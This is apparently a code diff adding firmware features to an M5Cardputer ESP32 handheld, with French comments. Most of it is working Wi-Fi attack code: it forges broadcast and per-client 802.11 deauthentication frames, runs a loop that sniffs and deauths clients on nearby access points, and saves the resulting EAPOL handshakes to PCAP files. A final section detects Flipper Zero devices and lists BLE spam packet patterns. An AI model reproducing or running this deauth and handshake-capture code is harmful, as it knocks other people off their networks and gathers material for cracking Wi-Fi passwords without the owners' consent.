+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
+      break; // Stop the attack
+    }
+  }
+  Serial.println("-------------------");
+  Serial.println("Stopping Deauth Attack");
+  Serial.println("-------------------");
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  /*esp_wifi_stop();
+    esp_wifi_deinit();*/
+
+  waitAndReturnToMenu("Stopping Deauth Attack");
+}
+
+void sendDeauthPacket() {
+  // Création d'une copie modifiable du paquet de déauthentification
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+  // Modifier les adresses MAC dans le paquet de déauthentification copié
+  for (int i = 0; i < 6; i++) {
+    deauth_frame[4 + i] = receiver_mac[i];  // Adresse MAC du récepteur
+    deauth_frame[10 + i] = source_mac[i];  // Adresse MAC source
+    deauth_frame[16 + i] = ap_mac[i];      // Adresse MAC de l'access point
+  }
+
+  // Envoyer le paquet modifié
+  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+
+  // Affichage du contenu du paquet pour le débogage
+  Serial.println("Deauthentication Frame:");
+  for (int i = 0; i < sizeof(deauth_frame); i++) {
+    Serial.print(deauth_frame[i], HEX);
+    Serial.print(" ");
+  }
+  Serial.println();
+}
+//deauther end
+
+
+// Sniff and deauth clients
+bool macFromString(const std::string& macStr, uint8_t* macArray) {
+  int values[6];  // Temporary array to store the parsed values
+  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
+             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
+    // Convert to uint8_t
+    for (int i = 0; i < 6; ++i) {
+      macArray[i] = static_cast<uint8_t>(values[i]);
+    }
+    return true;
+  }
+  return false;
+}
+
+
+void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
+  // Set the channel to the AP's channel
+  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  if (ret != ESP_OK) {
+    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
+    return;
+  }
+  M5.Lcd.setCursor(67, 1);
+  M5.Lcd.printf("C:");
+  M5.Lcd.print(channel);
+  M5.Lcd.print(" ");
+
+  // Set AP and source MAC addresses
+  updateMacAddresses(ap_mac);
+
+  // Set the receiver MAC to broadcast
+  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address
+
+  Serial.println("-----------------------------");
+  Serial.print("Deauth for AP MAC: ");
+  Serial.println(mac_to_string(ap_mac).c_str());
+  Serial.print("On Channel: ");
+  Serial.println(channel);
+
+
+  // Send 10 deauthentication packets
+  for (int i = 0; i < nbDeauthSend; i++) {
+    sendDeauthPacket();
+  }
+}
+
+void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
+  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  if (ret != ESP_OK) {
+    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
+    return;
+  }
+  M5.Lcd.setCursor(67, 1);
+  M5.Lcd.printf("C:");
+  M5.Lcd.print(channel);
+  M5.Lcd.print(" ");
+
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+  // Modifier les adresses MAC dans la trame de déauthentification
+  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
+  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
+  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)
+
+  // Envoyer la trame modifiée
+  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+/*
+  //Debugging output of packet contents
+  Serial.println("Deauthentication Frame Sent:");
+  for (int i = 0; i < sizeof(deauth_frame); i++) {
+    Serial.print(deauth_frame[i], HEX);
+    Serial.print(" ");
+  }
+  Serial.println();*/
+}
+
+void sendBroadcastDeauths() {
+  for (auto& ap : connections) {
+    if (!ap.second.empty() && isRegularAP(ap.first)) {
+      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
+        esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
+        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
+        Serial.println("-----------------------------");
+        Serial.print("Sending Broadcast Deauth to AP: ");
+        Serial.println(ap_names[ap.first].c_str());
+
+        M5.Lcd.setCursor(M5.Display.width() / 2 - 48 , M5.Display.height() / 2 + 24);
+        M5.Lcd.printf(ap_names[ap.first].c_str());
+
+        int channel = ap_channels_map[ap.first];
+        uint8_t ap_mac_address[6];
+        if (macFromString(ap.first, ap_mac_address)) {
+          broadcastDeauthAttack(ap_mac_address, channel);
+          // Après l'attaque de broadcast, envoyer une trame à chaque client
+          for (const auto& client : ap.second) {
+            uint8_t client_mac[6];
+            if (macFromString(client, client_mac)) {
+              Serial.println("-----------------------------");
+              Serial.print("Sending Deauth from client MAC ");
+              Serial.print(mac_to_string(client_mac).c_str());
+              Serial.print(" to AP MAC ");
+              Serial.println(mac_to_string(ap_mac_address).c_str());
+
+              M5.Lcd.setCursor(M5.Display.width() / 2 - 51 , M5.Display.height() / 2 + 16);
+              M5.Lcd.printf("Sending Deauth to");
+
+              for (int i = 0; i < nbDeauthSend; i++) {
+                sendDeauthToClient(client_mac, ap_mac_address, channel);
+              }
+            }
+          }
+          vTaskDelay(deauthWaitingTime);
+          M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 24);
+          M5.Lcd.printf("                                ");
+        } else {
+          Serial.println("Failed to convert AP MAC address from string.");
+        }
+        M5.Lcd.setCursor(M5.Display.width() / 2 - 51  , M5.Display.height() / 2 + 16);
+        M5.Lcd.printf("                       ");
+      }
+    }
+  }
+}
+
+std::string mac_to_string(const uint8_t* mac) {
+  char buf[18];
+  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return std::string(buf);
+}
+
+void changeChannel() {
+  static auto it = ap_channels.begin(); // Initialisation de l'iterator
+
+  // Vérification de l'existence de canaux
+  if (ap_channels.empty()) {
+    Serial.println("Aucun canal valide n'est disponible.");
+    return;
+  }
+
+  if (it == ap_channels.end()) {
+    it = ap_channels.begin();  // Réinitialiser l'iterator si nécessaire
+  }
+
+  int newChannel = *it;  // Récupérer le canal courant
+
+  // Vérification de la validité du canal
+  if (newChannel < 1 || newChannel > 13) {
+    Serial.println("Canal invalide détecté. Réinitialisation au premier canal valide.");
+    Serial.println(newChannel);
+    Serial.println(*it);
+    it = ap_channels.begin();  // Réinitialiser l'iterator
+    newChannel = *it;  // Récupérer un canal valide
+  }
+
+  // Tentative de changement du canal Wi-Fi
+  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
+  if (ret != ESP_OK) {
+    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
+    return;
+  }
+
+  // Mise à jour du canal actuel et avancement de l'iterator
+  currentChannel = newChannel;
+  it++;
+
+  // Affichage de la confirmation du changement
+  Serial.print("Switching channel on  ");
+  Serial.println(currentChannel);
+  Serial.println("-----------------------------");
+
+  // Mise à jour de l'affichage sur l'appareil M5
+  M5.Lcd.setCursor(67, 1);
+  M5.Lcd.printf("C:%d ", currentChannel);
+}
+
+
+void wifi_scan() {
+  Serial.println("-----------------------------");
+  Serial.println("Scanning WiFi networks...");
+  ap_channels.clear();
+  M5.Lcd.setCursor(M5.Display.width() / 2 - 78, M5.Display.height() - 32 );
+  M5.Lcd.printf("Scanning nearby networks..");
+
+  int n = WiFi.scanNetworks(false, false);
+  if (n == 0) {
+    Serial.println("No networks found");
+    M5.Lcd.setCursor(0, 1);
+    M5.Lcd.printf("No AP  ");
+    return;
+  }
+
+  Serial.print("Found ");
+  Serial.print(n);
+  Serial.println(" networks");
+
+  for (int i = 0; i < n; ++i) {
+    String ssid = WiFi.SSID(i);
+    int32_t rssi = WiFi.RSSI(i);
+    uint8_t *bssid = WiFi.BSSID(i);
+    int32_t channel = WiFi.channel(i);
+
+    std::string bssidString = mac_to_string(bssid);
+    ap_names[bssidString] = ssid.c_str();
+    ap_channels.insert(channel);
+    ap_channels_map[bssidString] = channel;
+
+    // Convert std::string to const char* for Serial.print
+    Serial.print(bssidString.c_str());
+    Serial.print(" | ");
+    Serial.print(ssid);
+    Serial.print(" | Channel: ");
+    Serial.println(channel);
+  }
+
+  Serial.println("-----------------------------");
+  M5.Lcd.setCursor(0, 1);
+  M5.Lcd.printf("AP:");
+  M5.Lcd.print(n);
+  M5.Lcd.print("  ");
+  M5.Lcd.drawLine(0, 9, M5.Lcd.width(), 9, TFT_WHITE);
+  delay(30);
+  M5.Lcd.setCursor(M5.Display.width() / 2 - 78, M5.Display.height() - 32);
+  M5.Lcd.printf("                          ");
+}
+
+
+
+bool isRegularAP(const std::string& mac) {
+  std::regex multicastRegex("^(01:00:5e|33:33|ff:ff:ff|01:80:c2)");
+  return !std::regex_search(mac, multicastRegex);
+}
+void print_connections() {
+  int yPos = 12;  // Initial Y position for text on the screen
+
+  for (auto& ap : connections) {
+    if (isRegularAP(ap.first)) {
+      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
+        // Clear the line before printing new data
+        M5.Lcd.fillRect(0, yPos, M5.Lcd.width(), 20, BLACK);
+
+        // Print to Serial
+        Serial.print(ap_names[ap.first].c_str());
+        Serial.print(" (");
+        Serial.print(ap.first.c_str());
+        Serial.print(") on channel ");
+        Serial.print(ap_channels_map[ap.first]);
+        Serial.print(" has ");
+        Serial.print(ap.second.size());
+        Serial.println(" clients:");
+        for (auto& client : ap.second) {
+          Serial.print(" - ");
+          Serial.println(client.c_str());
+        }
+        // Print to screen
+        String currentAPName = String(ap_names[ap.first].c_str());
+        int clientCount = ap.second.size();
+        String displayText = currentAPName + ": " + String(clientCount);
+
+        M5.Lcd.setCursor(0, yPos);
+        M5.Lcd.println(displayText);
+
+        yPos += 10;  // Move the Y position for the next line
+
+        // Ensure there is enough screen space for the next line
+        if (yPos > M5.Lcd.height() - 11) {
+          break;  // Exit the loop if there's not enough space for more lines
+        }
+      }
+    }
+  }
+  Serial.println("-----------------------------");
+}
+
+
+void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
+  const uint8_t *frame = pkt->payload;
+  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+  const uint8_t frameType = (frameControl & 0x0C) >> 2;
+  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
+
+  const uint8_t *bssid = frame + 16; // BSSID position for management frames
+  std::string bssidStr = mac_to_string(bssid);
+
+  if (estUnPaquetEAPOL(pkt)) {
+    Serial.println("-----------------------------");
+    Serial.println("EAPOL Detected !!!!!!!!!!!!!!!");
+    // Extract the BSSID from the packet, typically found at Address 3 in most WiFi frames
+    const uint8_t *bssid = frame + 16;
+
+    // Convert the BSSID to string format
+    std::string bssidStr = mac_to_string(bssid);
+
+    // Look up the AP name using the BSSID
+    std::string apName = ap_names[bssidStr];
+
+    // Print the AP name to the serial output
+    Serial.print("EAPOL Detected from AP: ");
+    if (!apName.empty()) {
+      Serial.println(apName.c_str());
+      M5.Lcd.setCursor(0 , M5.Display.height() - 8);
+      String eapolapname = apName.c_str();
+      M5.Lcd.print("EAPOL!:" + eapolapname + "                         ");
+    } else {
+      Serial.println("Unknown AP");
+      M5.Lcd.setCursor(0 , M5.Display.height() - 8);
+      M5.Lcd.printf("EAPOL from Unknow                                 ");
+    }
+    Serial.println("-----------------------------");
+
+
+    enregistrerDansFichierPCAP(pkt, false);
+    nombreDeEAPOL++;
+    M5.Lcd.setCursor(114, 1);
+    M5.Lcd.printf("H:");
+    M5.Lcd.print(nombreDeHandshakes);
+    if (nombreDeEAPOL < 99) {
+      M5.Lcd.setCursor(162, 1);
+    } else {
+      M5.Lcd.setCursor(153, 1);
+    }
+    M5.Lcd.printf("E:");
+    M5.Lcd.print(nombreDeEAPOL);
+    esp_task_wdt_reset();  // Réinitialisation du watchdog
+    // Délay pour permettre au task IDLE de s'exécuter
+    vTaskDelay(pdMS_TO_TICKS(10));
+  }
+
+  if (frameType == 0x00 && frameSubType == 0x08) {
+    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+
+    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
+
+
+    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+    esp_task_wdt_reset();  // Réinitialisation du watchdog
+    vTaskDelay(pdMS_TO_TICKS(10));
+    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
+  }
+
+  if (frameType != 2) return;
+
+  const uint8_t *mac_ap = frame + 4;
+  const uint8_t *mac_client = frame + 10;
+  std::string ap_mac = mac_to_string(mac_ap);
+  std::string client_mac = mac_to_string(mac_client);
+
+  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;
+
+  if (connections.find(ap_mac) == connections.end()) {
+    connections[ap_mac] = std::vector<std::string>();
+  }
+  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
+    connections[ap_mac].push_back(client_mac);
+  }
+}
+
+
+void purgeAllAPData() {
+  connections.clear();  // Clears all client associations
+  M5.Lcd.fillRect(0, 10, M5.Lcd.width(), M5.Lcd.height() - 11, BLACK);
+  Serial.println("All AP and client data have been purged.");
+}
+
+
+void deauthClients() {
+  M5.Display.clear();
+
+  //ESP_BT.end();
+  //bluetoothEnabled = false;
+  esp_wifi_set_promiscuous(false);
+  WiFi.disconnect(true);  // Déconnecte et efface les paramètres WiFi enregistrés
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_restore();
+  delay(270); // Petite pause pour s'assurer que tout est terminé
+
+  nvs_flash_init();
+  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg4);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_STA);;
+  esp_wifi_start();
+  delay(30);
+
+  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+  if (ret != ESP_OK) {
+    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
+    return;
+  }
+
+  purgeAllAPData();
+  wifi_scan();
+
+  M5.Lcd.fillRect(0, 10, M5.Lcd.width(), M5.Lcd.height() - 11, BLACK);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+
+  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Lcd.setCursor(M5.Display.width() - 24, 1);
+  M5.Lcd.printf("D:");
+  if (isDeauthActive) {
+    M5.Lcd.print("1");
+  } else {
+    M5.Lcd.print("0");
+  }
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+
+  unsigned long lastKeyPressTime = 0;
+  const unsigned long debounceDelay = 1000;
+
+  while (true) {
+    esp_task_wdt_reset();
+    vTaskDelay(pdMS_TO_TICKS(10));
+    M5.update();
+    M5Cardputer.update();
+
+    unsigned long currentPressTime = millis();
+
+    if (M5Cardputer.Keyboard.isKeyPressed('d') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      isDeauthActive = !isDeauthActive;
+      Serial.println(isDeauthActive ? "Deauther activated !" : "Deauther disabled !");
+      M5.Lcd.setCursor(M5.Display.width() - 24, 1);
+      M5.Lcd.printf("D:%d", isDeauthActive ? 1 : 0);
+      lastKeyPressTime = currentPressTime;
+    }
+
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      esp_wifi_set_promiscuous(false);
+      esp_wifi_set_promiscuous_rx_cb(NULL);
+      break;
+    }
+
+    if (M5Cardputer.Keyboard.isKeyPressed('f') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      if (!isDeauthFast) {
+        isDeauthFast = true;
+        scanInterval = 30000; // interval of deauth and scanning network fast
+        channelChangeInterval = 5000; // interval of channel switching fast
+        clientPurgeInterval = 60000; //interval of clearing the client to exclude no more connected client or ap that not near anymore fast
+        deauthWaitingTime = 5000;
+        nbDeauthSend = 5;
+        Serial.println("Fast mode enabled !");
+        M5.Lcd.setCursor(M5.Display.width() - 30, 1);
+        M5.Lcd.printf("F");
+      } else {
+        isDeauthFast = false;
+        scanInterval = 90000; // interval of deauth and scanning network
+        channelChangeInterval = 15000; // interval of channel switching
+        clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
+        deauthWaitingTime = 7500;
+        nbDeauthSend = 10;
+        Serial.println("Fast mode disabled !");
+        M5.Lcd.setCursor(M5.Display.width() - 30, 1);
+        M5.Lcd.printf(" ");
+      }
+      lastKeyPressTime = currentPressTime;
+    }
+
+    unsigned long currentTimeAuto = millis();
+
+    // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
+    if (currentTimeAuto - lastScanTime >= scanInterval) {
+      if (isDeauthActive) {
+        sendBroadcastDeauths();  // Déconnexion broadcast
+      }
+      esp_wifi_set_promiscuous_rx_cb(NULL);
+      wifi_scan();  // Lancement du scan
+      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+      lastScanTime = currentTimeAuto;
+      lastChannelChange = currentTimeAuto;  // Réinitialisation du timer pour éviter les conflits avec le changement de canal
+    }
+
+    // Purge des clients toutes les 5 minutes, assuré de ne pas coincider avec le scan
+    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
+      purgeAllAPData();  // Purge des données
+      lastClientPurge = currentTimeAuto;
+    }
+
+    // Gestion de l'affichage des connexions toutes les 2 secondes
+    if (currentTimeAuto - lastPrintTime >= 2000) { // 2 seconde
+      print_connections();
+      lastPrintTime = currentTimeAuto;
+    }
+
+
+    // Changement de channel toutes les 15 secondes, seulement si un scan n'est pas en cours
+    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
+      changeChannel();
+      lastChannelChange = currentTimeAuto;
+    }
+
+  }
+  waitAndReturnToMenu("Stopping Sniffing...");
+}
+
+
+// Sniff and deauth clients end
+
+
+//Check handshake
+std::vector<String> pcapFiles;
+int currentListIndexPcap = 0;
+
+void checkHandshakes() {
+  loadPcapFiles();
+  displayPcapList();
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+
+  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
+  const unsigned long debounceDelay = 250;  // Delai de debounce en millisecondes
+
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+    unsigned long currentPressTime = millis();
+
+    if (M5Cardputer.Keyboard.isKeyPressed('.') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      navigatePcapList(true); // naviguer vers le bas
+      lastKeyPressTime = currentPressTime;
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(';') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      navigatePcapList(false); // naviguer vers le haut
+      lastKeyPressTime = currentPressTime;
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+      waitAndReturnToMenu("return to menu");
+      return;
+    }
+  }
+}
+
+
+void loadPcapFiles() {
+  File root = SD.open("/handshakes");
+  pcapFiles.clear();
+  while (File file = root.openNextFile()) {
+    if (!file.isDirectory()) {
+      String filename = file.name();
+      if (filename.endsWith(".pcap")) {
+        pcapFiles.push_back(filename);
+      }
+    }
+  }
+  if (pcapFiles.size() > 0) {
+    currentListIndexPcap = 0; // Réinitialisez l'indice si de nouveaux fichiers sont chargés
+  }
+}
+
+void displayPcapList() {
+  const int listDisplayLimit = M5.Display.height() / 18;
+  int listStartIndex = max(0, min(currentListIndexPcap, int(pcapFiles.size()) - listDisplayLimit));
+
+  M5.Display.clear();
+  M5.Display.setTextSize(1);
+  for (int i = listStartIndex; i < min(int(pcapFiles.size()), listStartIndex + listDisplayLimit); i++) {
+    if (i == currentListIndexPcap) {
+      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
+      M5.Display.setTextColor(TFT_GREEN);
+    } else {
+      M5.Display.setTextColor(TFT_WHITE);
+    }
+    M5.Display.setCursor(10, (i - listStartIndex) * 18);
+    M5.Display.println(pcapFiles[i]);
+  }
+  M5.Display.display();
+}
+
+void navigatePcapList(bool next) {
+  if (next) {
+    currentListIndexPcap++;
+    if (currentListIndexPcap >= pcapFiles.size()) {
+      currentListIndexPcap = 0;
+    }
+  } else {
+    currentListIndexPcap--;
+    if (currentListIndexPcap < 0) {
+      currentListIndexPcap = pcapFiles.size() - 1;
+    }
+  }
+  displayPcapList();
+}
+//Check handshake end
+
+
+
+// Wof part // from a really cool idea of Kiyomi // https://github.com/K3YOMI/Wall-of-Flippers
+unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
+static bool isBLEInitialized = false;
+
+struct ForbiddenPacket {
+  const char* pattern;
+  const char* type;
+};
+
+std::vector<ForbiddenPacket> forbiddenPackets = {
+  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"}, // not working ?
+  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"}, // refactored for working
+  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"}, // working
+  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"}, // working
+  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"}, // not working cant find raw data in sniff
+  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},// refactored for working
+  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},//working
+  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},//working
+  {"ff006db643ce97fe427c___________", "LOVE_TOYS"} // working
+};
+
+bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
+  size_t patternLength = strlen(pattern);
+  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
+    char byteString[3] = {pattern[i], pattern[i + 1], 0};
+    if (byteString[0] == '_' && byteString[1] == '_') continue;
+
+    uint8_t byteValue = strtoul(byteString, nullptr, 16);
+    if (payload[j] != byteValue) return false;
+  }
+  return true;
+}
+
+class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
+    int lineCount = 0;
+    const int maxLines = 10;
+    void onResult(BLEAdvertisedDevice advertisedDevice) override {
+      String deviceColor = "Unknown"; // Défaut
+      bool isValidMac = false; // validité de l'adresse MAC
+      bool isFlipper = false; // Flag pour identifier si le dispositif est un Flipper
+
+      // Vérifier directement les UUIDs pour déterminer la couleur
+      if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
+        deviceColor = "White";
+        isFlipper = true;
+      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
+        deviceColor = "Black";
+        isFlipper = true;
+      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
+        deviceColor = "Transparent";
+        isFlipper = true;
+      }
+
+      // Continuer uniquement si un Flipper est identifié
+      if (isFlipper) {
+        String macAddress = advertisedDevice.getAddress().toString().c_str();
+        if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27")) {
+          isValidMac = true;
+        }
+
+        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
+        M5.Display.setCursor(0, 10);
+        String name = advertisedDevice.getName().c_str();
+
+        M5.Display.printf("Name: %s\nRSSI: %d \nMAC: %s\n",
+                          name.c_str(),
+                          advertisedDevice.getRSSI(),
+                          macAddress.c_str());
+        recordFlipper(name, macAddress, deviceColor, isValidMac); // Passer le statut de validité de l'adresse MAC
+        lastFlipperFoundMillis = millis();
+      }
+
+      std::string advData = advertisedDevice.getManufacturerData();
+      if (!advData.empty()) {
+        const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
+        size_t length = advData.length();
+
+        /*
+                Serial.print("Raw Data: ");
+                for (size_t i = 0; i < length; i++) {
+                  Serial.printf("%02X", payload[i]); // Afficher chaque octet en hexadécimal
+                }
+                Serial.println(); // Nouvelle ligne après les données brutes*/
+
+        for (auto& packet : forbiddenPackets) {
+          if (matchPattern(packet.pattern, payload, length)) {
+            if (lineCount >= maxLines) {
+              M5.Display.fillRect(0, 58, 325, 185, BLACK); // Réinitialiser la zone d'affichage des paquets interdits
+              M5.Display.setCursor(0, 59);
+              lineCount = 0; // Réinitialiser si le maximum est atteint
+            }
+            M5.Display.printf("%s\n", packet.type);
+            lineCount++;
+            break;
+          }
+        }
+      }
+    }
+};
+
+
+bool isMacAddressRecorded(const String& macAddress) {
+  File file = SD.open("/WoF.txt", FILE_READ);
+  if (!file) {
+    return false;
+  }
+  while (file.available()) {
+    String line = file.readStringUntil('\n');
+    if (line.indexOf(macAddress) >= 0) {
+      file.close();
+      return true;
+    }
+  }
+
+  file.close();
+  return false;
+}
+
+void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
+  if (!isMacAddressRecorded(macAddress)) {
+    File file = SD.open("/WoF.txt", FILE_APPEND);
+    if (file) {
+      String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
+      file.println(name + " - " + macAddress + " - " + color + status);
+      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
+    }
+    file.close();
+  }
+}
+
+void initializeBLEIfNeeded() {
+  if (!isBLEInitialized) {
+    BLEDevice::init("");
+    isBLEInitialized = true;
+    Serial.println("BLE initialized for scanning.");
+  }
+}
+
+
+void wallOfFlipper() {
+  bool btnBPressed = false; //debounce
+  M5.Display.fillScreen(BLACK);
+  M5.Display.setCursor(0, 10);
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(WHITE);
+  M5.Display.println("Waiting for Flipper");
+
+  initializeBLEIfNeeded();
+  delay(200);
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+  while (true) {
+    M5.update(); // Mettre à jour l'état des boutons
+    M5Cardputer.update();
+    // Gestion du bouton B pour basculer entre le mode auto et statique
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      waitAndReturnToMenu("Stop detection...");
+      return;
+    }
+    if (millis() - lastFlipperFoundMillis > 10000) { // 30000 millisecondes = 30 secondes
+      M5.Display.fillScreen(BLACK);
+      M5.Display.setCursor(0, 10);
+      M5.Display.setTextSize(1);
+      M5.Display.setTextColor(WHITE);
+      M5.Display.println("Waiting for Flipper");
+
+      lastFlipperFoundMillis = millis();
+    }
+    BLEScan* pBLEScan = BLEDevice::getScan();
+    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
+    pBLEScan->setActiveScan(true);
+    pBLEScan->start(1, false);
+  }
+  waitAndReturnToMenu("Stop detection...");
+}
+// Wof part end
